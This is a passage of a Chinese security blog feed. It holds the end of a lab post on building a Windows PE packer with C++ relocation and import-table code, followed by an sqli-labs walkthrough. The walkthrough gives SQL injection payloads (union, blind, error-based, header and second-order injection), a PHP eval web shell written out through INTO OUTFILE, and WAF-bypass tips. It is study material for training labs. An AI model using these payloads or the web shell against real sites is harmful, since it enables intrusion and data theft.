RepairRelocate() 函数修改而来，首先对类定义了一些成员和方法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">DWORD inRelocSize;</span><br><span class="line">PIMAGE_BASE_RELOCATION inRelocTable;</span><br><span class="line">------</span><br><span class="line">    </span><br><span class="line"><span class="function">DWORD <span class="title">MyShell::Foa2Rva</span><span class="params">(DWORD foa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD rva = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (PIMAGE_SECTION_HEADER p = pSectionHeader; p-&gt;Name != <span class="literal">NULL</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (foa &gt;= p-&gt;PointerToRawData &amp;&amp; foa &lt; p-&gt;PointerToRawData + p-&gt;SizeOfRawData)</span><br><span class="line">&#123;</span><br><span class="line">rva = foa + p-&gt;VirtualAddress - p-&gt;PointerToRawData;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> rva;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">MyShell::Rva2Foa</span><span class="params">(DWORD rva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD foa = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (PIMAGE_SECTION_HEADER p = pSectionHeader; p-&gt;Name != <span class="literal">NULL</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (rva &gt;= p-&gt;VirtualAddress &amp;&amp; rva &lt; p-&gt;VirtualAddress + p-&gt;Misc.VirtualSize)</span><br><span class="line">&#123;</span><br><span class="line">foa = rva - p-&gt;VirtualAddress + p-&gt;PointerToRawData;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> foa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyShell::GetInRelocTable</span><span class="params">(<span class="keyword">char</span>* sectionBuff, DWORD offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">inRelocTable = (PIMAGE_BASE_RELOCATION)(sectionBuff + offset);</span><br><span class="line">PIMAGE_BASE_RELOCATION pInR = inRelocTable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pInR-&gt;SizeOfBlock)</span><br><span class="line">&#123;</span><br><span class="line">inRelocSize++;</span><br><span class="line">pInR++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改后的</span></span><br><span class="line"><span class="function">BOOL <span class="title">MyShell::RepairRelocate</span><span class="params">(DWORD imageBase, <span class="keyword">char</span>* sectionBuff,DWORD offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取dll重定位表</span></span><br><span class="line">PIMAGE_DOS_HEADER pDllDosHeader = (PIMAGE_DOS_HEADER)imageBase;</span><br><span class="line">PIMAGE_NT_HEADERS pDllNtHeader = (PIMAGE_NT_HEADERS)(pDllDosHeader-&gt;e_lfanew + imageBase);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pDllOptionHeader = &amp;(pDllNtHeader-&gt;OptionalHeader);</span><br><span class="line">PIMAGE_BASE_RELOCATION pDllRelocate = (PIMAGE_BASE_RELOCATION)(pDllOptionHeader-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress + imageBase);</span><br><span class="line">PIMAGE_SECTION_HEADER pDllSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pDllNtHeader);</span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode段RVA</span></span><br><span class="line">DWORD shellCodeRVA = <span class="built_in">Foa2Rva</span>(sectionBuff - fileBuff);</span><br><span class="line">PIMAGE_BASE_RELOCATION pInR = inRelocTable;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历重定位表</span></span><br><span class="line"><span class="keyword">while</span> (pDllRelocate-&gt;SizeOfBlock)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//取word类型个数</span></span><br><span class="line">DWORD reCount = (pDllRelocate-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">char</span>* begin = (<span class="keyword">char</span> *)pDllRelocate + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历每个小数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; reCount; i++)</span><br><span class="line">&#123;</span><br><span class="line">WORD* pRelocRva = (WORD*)begin;</span><br><span class="line"><span class="comment">//有效位判断</span></span><br><span class="line"><span class="keyword">if</span> ((*pRelocRva &amp; <span class="number">0x3000</span>) == <span class="number">0x3000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//取DLL内立即数rva</span></span><br><span class="line">DWORD relocRva = (*pRelocRva &amp; <span class="number">0xfff</span>) + pDllRelocate-&gt;VirtualAddress;</span><br><span class="line"><span class="comment">//计算offset</span></span><br><span class="line">DWORD offset = relocRva - pDllSectionHeader-&gt;VirtualAddress;</span><br><span class="line"><span class="comment">//计算镜像中立即数地址</span></span><br><span class="line">DWORD SectionCount = pFileHeader-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER pLastSectionHeader = pSectionHeader + (SectionCount - <span class="number">1</span>);</span><br><span class="line">DWORD destAddr = offset +(DWORD)(fileBuff + pLastSectionHeader-&gt;PointerToRawData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算变量相对节区offset</span></span><br><span class="line">offset = (*(DWORD*)destAddr - imageBase) - pDllSectionHeader-&gt;VirtualAddress;</span><br><span class="line"><span class="comment">//计算变量于镜像内新VA并修改</span></span><br><span class="line">DWORD aimVA = offset + (pLastSectionHeader-&gt;VirtualAddress + pOptionHeader-&gt;ImageBase);</span><br><span class="line">*(DWORD*)destAddr = aimVA;</span><br><span class="line">&#125;</span><br><span class="line">begin += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修复壳代码重定位表</span></span><br><span class="line">pInR-&gt;VirtualAddress = pDllRelocate-&gt;VirtualAddress - pDllSectionHeader-&gt;VirtualAddress + shellCodeRVA;</span><br><span class="line">pDllRelocate = (PIMAGE_BASE_RELOCATION)(pDllRelocate-&gt;SizeOfBlock + (DWORD)pDllRelocate);</span><br><span class="line">pInR++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改目标data目录指向注入重定位表</span></span><br><span class="line">DWORD ss = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">SaveOldReloc</span>(&amp;ss);</span><br><span class="line">DWORD tableNewRva = <span class="built_in">Foa2Rva</span>((DWORD)sectionBuff + offset - (DWORD)fileBuff - ss);</span><br><span class="line">pOptionHeader-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress = tableNewRva;</span><br><span class="line">pOptionHeader-&gt;DataDirectory[<span class="number">5</span>].Size += pDllOptionHeader-&gt;DataDirectory[<span class="number">5</span>].Size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>步骤五，实则已经实现，在步骤一将两张重定位表顺序插入shellcode之后，且在上面的代码中最后几段将导入表size更改为了两个size叠加；</p><p>用这个方法可以绕过动态基质，但是这个架构写出的壳有个bug，导致原程序加壳后变成固定基址了…虽然可以正常跑….</p><h3 id="加密导入表"><a href="#加密导入表" class="headerlink" title="加密导入表"></a>加密导入表</h3><p>此步骤针对于程序安全性质而言；</p><p>针对加壳程序的导入表加密，对API进行保护；</p><p>步骤：</p><ul><li>转移导入表进新区段，并抹掉原导入表（填充00，并将datadirectory[1]指向一个假表）；</li><li>对API名称加密；</li><li>对新导入表加密；</li><li>于壳代码中解密并手动模拟导入表的修复（使用对应dll的导出表）；</li></ul><p>此处只给出了转移导入表部分的代码，对于后期加密部分可参考上一篇 Windows_ShellCode；</p><p>当此处实现后，因为可以由代码自己修复导入表和重定位表，则原程序的.idata段和.reloc段就随便乱改都没问题了；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//新增字段</span></span><br><span class="line">DWORD importTableSize;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportTable;</span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">MyShell::GetImportTable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)(<span class="built_in">Rva2Foa</span>(pOptionHeader-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress) + (DWORD)fileBuff);</span><br><span class="line"><span class="keyword">for</span> (PIMAGE_IMPORT_DESCRIPTOR p = pImportTable; p-&gt;Name != <span class="literal">NULL</span>; p++)</span><br><span class="line">importTableSize++;</span><br><span class="line">importTableSize++;</span><br><span class="line">importTableSize *= <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_IMPORT_DESCRIPTOR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">char</span> *)pImportTable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyShell::MoveImportTable</span><span class="params">(<span class="keyword">char</span>* sectionBuff, DWORD offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR newImportTable = (PIMAGE_IMPORT_DESCRIPTOR)(sectionBuff + offset);</span><br><span class="line"><span class="comment">//移动到指定区段偏移位置</span></span><br><span class="line"><span class="built_in">memcpy</span>(newImportTable, pImportTable, importTableSize);</span><br><span class="line"><span class="built_in">memset</span>(pImportTable, <span class="number">0x00</span>, importTableSize);</span><br><span class="line">pImportTable = newImportTable;</span><br><span class="line"><span class="comment">//修改datadirectory对应rva</span></span><br><span class="line">pOptionHeader-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress = <span class="built_in">Foa2Rva</span>((DWORD)newImportTable - (DWORD)fileBuff);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">MyShell::GetImportTableSize</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> importTableSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密这里有个坑，按dll遍历函数名称填地址的时候，kernel32和kernelbase里有ntdll的函数引用，但是又有同名函数干扰，要想办法将对应dll的API地址填充正确，解决方法是判断导入表名称是否为kernel32或者kernelbase，如果是则多循环一次，多循环的一次dll则加载ntdll；</p><p>完成所有内容（包括加密导入表的所有步骤）的加壳项目：</p><p>关于加壳dll需要添加一个名字结构数组来传递模块名称，否则GetModuleHandle(0)是进程基址；</p><p>（ BUG 肯定是有的（ 缺陷是支持32位且节区头需要空闲 （</p><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>脱壳手段于之前基础篇大部分都提及;</p><p>此外，esp定律一般是哄骗小学生的，大部分时候都用不到；</p><p>但基础篇尚未提及一点，在dump之后的文件虽然是可以查看其源码的，但如果需要动调，是无法实现的；</p><p>此时要让dump的程序能运行，则需要修复其导入表，因为此时导入表dump出的是实打实的地址，需要利用地址反找函数符号，重新构建导入表结构；</p><p>修复导入表一般用脚本完成，脚本实现思路如上述所示；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;壳的原理&quot;&gt;&lt;a href=&quot;#壳的原理&quot; class=&quot;headerlink&quot; title=&quot;壳的原理&quot;&gt;&lt;/a&gt;壳的原理&lt;/h2&gt;&lt;p&gt;PE文件到运行时经过的几步重要步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将硬盘中的PE文件复制到内存中；&lt;/li&gt;
&lt;li&gt;按内存对</summary>
      
    
    
    
    <category term="Lab" scheme="https://secondbc.github.io/SecondBC/categories/Lab/"/>
    
    
    <category term="Reverse" scheme="https://secondbc.github.io/SecondBC/tags/Reverse/"/>
    
    <category term="Bin" scheme="https://secondbc.github.io/SecondBC/tags/Bin/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-sqlilabs</title>
    <link href="https://secondbc.github.io/SecondBC/2024/02/26/SQL%E6%B3%A8%E5%85%A5-sqlilabs/"/>
    <id>https://secondbc.github.io/SecondBC/2024/02/26/SQL%E6%B3%A8%E5%85%A5-sqlilabs/</id>
    <published>2024-02-26T08:42:33.000Z</published>
    <updated>2024-05-20T10:46:14.032Z</updated>
    
    <content type="html"><![CDATA[<p>本篇根据sqli-labs展开而来笔记，基于mysql，php的环境；</p><p>前置知识：SQL语法，在SQL学习日记中有讲述；</p><h2 id="less01-less04"><a href="#less01-less04" class="headerlink" title="less01~less04"></a>less01~less04</h2><h3 id="解题一般步骤-思路"><a href="#解题一般步骤-思路" class="headerlink" title="解题一般步骤/思路"></a>解题一般步骤/思路</h3><ol><li>判断是否可注入（单引号/双引号/括号报错）</li><li>判断字段数，使用order by n；<ul><li>order by n 的含义是按照第n个字段排序；</li></ul></li><li>确定回显字段，使用 union select 1,2,…,n;<ul><li>联合查找将前面的select联系起来，select 常数 的含义是给查询结果一个临时的列，这个列所有行都是这个常数，一共有表内对象个的行数；</li><li>在使用时，往往回显只显示第一行（联合查找前半段），需要将第一行的内容屏蔽掉，如limit，或者使第一行等于一个非法值；</li></ul></li><li>利用回显的字段查询出数据库，表，字段，以及需要的所有数据；</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata  #找库</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#x27;</span>#从库找表</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#x27;</span>#从表找字段</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> xxx.xxx#找数据</span><br></pre></td></tr></table></figure><p>在找数据时，经常用到以下两个函数：</p><h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h3><ul><li>使此函数括号内的查询结果拼成一行，如图；</li></ul><p><img src="https://s2.loli.net/2023/10/16/LdE7GvQUlF1cApX.png" alt="group_concat()"></p><h3 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws()"></a>concat_ws()</h3><ul><li>此函数有三个参数，第一个为拼接符，后两个为拼接字段，输出为两个字段的拼接态，如图;</li></ul><p><img src="https://s2.loli.net/2023/10/16/8ibBxTZWR9gsXIU.png" alt="concat_ws"></p><p>为什么需要使用这两个函数？正如前面所述，回显一般只显示查询的第一行，需要将查到的账号密码拼接而且合并为一行输出，这样才能在回显上观察到需要的全貌；</p><h2 id="less05-less06"><a href="#less05-less06" class="headerlink" title="less05~less06"></a>less05~less06</h2><p>此类型为：</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>回显只会显示查询结果正确或是错误，不会回显出查询的内容；</p><p>使用以下函数以进行对字符串的操作：</p><h4 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h4><p>其中有两个参数，第一个为字符串，第二个为长度，作用为从左截取长度个字符串内的字符；</p><p>例如以下内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">left</span>(database(),<span class="number">4</span>);#截取当前数据库名的前<span class="number">4</span>个字符</span><br></pre></td></tr></table></figure><p>由此可以对截取内容进行比较：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>;#正确返回<span class="number">1</span>，错误返回<span class="number">0</span></span><br></pre></td></tr></table></figure><p>由此来使得获取库名的目的；</p><h4 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h4><p>三个参数，第一个为字符串，第二个为起始位置，第三个为截取长度，例如substr(a,b,c)，作用为截取a字符串，从b位置开始，截取c位长度；</p><h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h4><p>将输入的字符转为其ascii值；</p><p>使用以上函数便可完成对字符的判断，从而得到库名，一般不会直接使用等于多少多少字符，而是每个字符转为ascii后采用二分法判断其是哪个字符；</p><p>当然也可用BP抓包，暴力破解，具体步骤为抓包-&gt;转发测试器(Intruder)-&gt;添加变量位置-&gt;选择暴力破解-&gt;规定字符集以及长度-&gt;选择进程数-&gt;开始；</p><p>测出的发包观察其长度变化，找到独异个体，查看其响应包内是否为正确回显即可；</p><p>之后便根据此方法依次判断库名，表名，字段名，以及账号密码；</p><h2 id="less07"><a href="#less07" class="headerlink" title="less07"></a>less07</h2><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>由于才疏识浅，能找到的内容如下，会有不严谨和错误的地方：</p><p>php版本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传到目的网址后，使用中国菜刀打开其路径并加上pass变量，即可查看其所有数据；</p><p>其含义为 <code>&lt;?php ?&gt;</code> 是html将此包裹里的内容作为php语句执行；</p><p>艾特符号取消报错，eval函数将输入的字符串作为命令执行；</p><p>$_POST变量是全局的php变量，也是一个数组，括号内的pass则是其下标，对应pass变量，译作将post发送的内容转给pass变量；</p><p>整句话的意思是：将post的内容作为指令在服务器上执行；</p><p>中国菜刀的原理简单理解为窗口化的post输入指令，每点一下都是在对服务器post指令；</p><h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p>写文件关键字，用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a,b,c <span class="keyword">into</span> outfile <span class="string">&#x27;path\\1.txt&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><p>读文件，直接跟在select后面作为查询内容，参数为文件路径；</p><p>解法也如同之前所述，先判断注入点，之后用 into outfile 将一句话木马作为字符串写入目标文件内，之后便可用中国菜刀访问web shell；</p><h2 id="less08-less10"><a href="#less08-less10" class="headerlink" title="less08~less10"></a>less08~less10</h2><h3 id="if"><a href="#if" class="headerlink" title="if()"></a>if()</h3><p>类似三目运算，三个参数，第一个为条件，第二个为真时返回值，第三个为假时返回值；</p><p>if函数一般与sleep函数一起使用，sleep函数的参数单位为秒，构成时间盲注的句子；</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>当回显内容为空时，此时可以采用时间盲注的方法；</p><p>回显为空时如何判断注入漏洞？在可能出现漏洞的地方加入sleep函数来测试，是否响应时间变动；</p><p>布尔盲注是根据回显判断内容是否正确，那么时间盲注即是根据响应时间来判断是否正确，如下面一段话：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if(length(database())<span class="operator">=</span><span class="number">7</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><p>当前数据库名长度为7时返回1，否则睡眠5秒，在where中加入此条件的话，会导致判断时网页的响应时间发生变化，由此进行判断；</p><p>由此方法与布尔盲注类似，不断去判断库名，表名，字段名，拿到数据；</p><p>也可以用sqlmap脚本自动爆破，以及bp；</p><p>此方法的开销较大，一般不选用；</p><h2 id="less11-less16"><a href="#less11-less16" class="headerlink" title="less11~less16"></a>less11~less16</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>比起get注入，需要注意的点为参数名称需要用bp抓包来获取，之后使用hackbar的post方法发包，且注释符需要使用 # ，–+ 一般用于url中；</p><p>获取到注入点也同之前一样，之后，可使用 or 1=1 来永真返回；</p><p>查找表和数据的步骤如之前一样进行；</p><p>盲注步骤也一样；</p><h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>核心函数：</p><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>三个参数，第一个为XML文档对象的名称，第二个为Xpath格式的字符串，第三个为替换数据；</p><p>作用为改变文档中符合条件的节点；</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>两个参数，用法同上函数，第一个参数为对象名，第二个为Xpath格式的字符串；</p><p>而在报错注入中，concat函数返回的类型时一个字符串，不符合xpath的格式，所以会报错，并给出这个字符串的内容，从而获取信息；</p><p>如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>会导致其报错而显示database的内容：</p><p><img src="https://s2.loli.net/2023/10/19/ldjkMuKAaqteV3x.png" alt="xpath error"></p><p>这个方法有什么用？ </p><p>高效：对于无回显可以这么用，直接拿名称；</p><p>防止过滤关键词，比如不让用union select了怎么查呢？</p><h2 id="less18-less22"><a href="#less18-less22" class="headerlink" title="less18~less22"></a>less18~less22</h2><h3 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h3><p>当发包信息参与了sql语句时，可以利用http头进行注入（如回显有这些内容时，可以猜测）；</p><p>一般是将useragent，或者ip，或者等等的头信息作为参数加入sql语言中；</p><p>思路是使用bp重构这些参数，使其在sql语句中时产生注入漏洞；</p><p>注意：不要打乱这些参数序列！！！（<strong>构造闭合</strong>）</p><p>cookie注入如法炮制，cookie的发包一般在原包的后面一个包，里面包含了cookie字段；</p><p>对于base64编码的内容，也需要将构造的payload进行base64编码然后发包;</p><p>例如：</p><p>18关登录成功的情况下是会回显useragent的：</p><p><img src="https://s2.loli.net/2023/10/19/KpeqE9VPILt5oxb.png" alt="feedback"></p><p>利用bp的重发器，在useragent的地方使用单引号判断出有注入漏洞，则可在这个位置进行payload构造：</p><p><img src="https://s2.loli.net/2023/10/19/lOyI3ozBK4kQsAZ.png" alt="repeat"></p><p>注意根据语法错误构造闭合：</p><p>原内容为注入点后面还有两个字符串，并且有个括号，那么构造payload应该为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; payload,&#x27;&#x27;,&#x27;&#x27;) #</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">&#x27;</span> payload <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>之后如法炮制拿数据；</p><p>至此，基础篇结束；</p><h2 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h2><p>当 –+ 或者 # 被注释掉时，可以试用如下内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure><p>我的理解是单引号分割语句，%00为url编码中的空字符对后面的内容进行截断，导致sql语言能正常执行；</p><p>也可以构造常规语句来闭合引号；</p><h3 id="SQL语句执行顺序"><a href="#SQL语句执行顺序" class="headerlink" title="SQL语句执行顺序"></a>SQL语句执行顺序</h3><p>在where附加条件时，如果order by 后面还有跟 and or 一类的连接符，order by 会被忽略掉；</p><h2 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>注入时，特殊字符被转义无法导致注入，只有将转义后的内容存入数据库，之后引用这个数据时发生注入漏洞，称二次注入；</p><p>例子：在注册用户时，给已有用户名后面加 ‘# 符号，致使 user’#被创建，在修改密码时，引用字符应为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;sss&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>此时发生注入漏洞，并将原本的user账户的密码修改了；</p><h2 id="less25-less25a"><a href="#less25-less25a" class="headerlink" title="less25~less25a"></a>less25~less25a</h2><h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><p>可分为三类：</p><ul><li><p>白盒绕过</p><ul><li>通过获取源码分析的方式进行绕过；</li></ul></li><li><p>黑盒绕过</p><ul><li><p>架构层面</p><p>​    寻找原网站绕过：针对云WAF，云waf的作用类似于拦截网，先通过其进行验证，之后将数据交给原网址，类似CDN；</p><p>​    对于CDN：通过超级ping，在不同地区的CDN返回ping值不同的结果；</p><p>​            注册，直接转到原网站；</p><p>​            通过国外IP地址访问，对于个别网站CDN只针对于国内；</p><p>​    通过同网段绕过：一个网段中，经过的数据可能不会经过云WAF，可以先拿到网段中其他主机的权限，对目标交互；</p><p>​    对于网段解释：192.168.1.0 ~ 192.168.1.255称为一段 （局域网概念）</p></li><li><p>资源限制角度</p><p>​    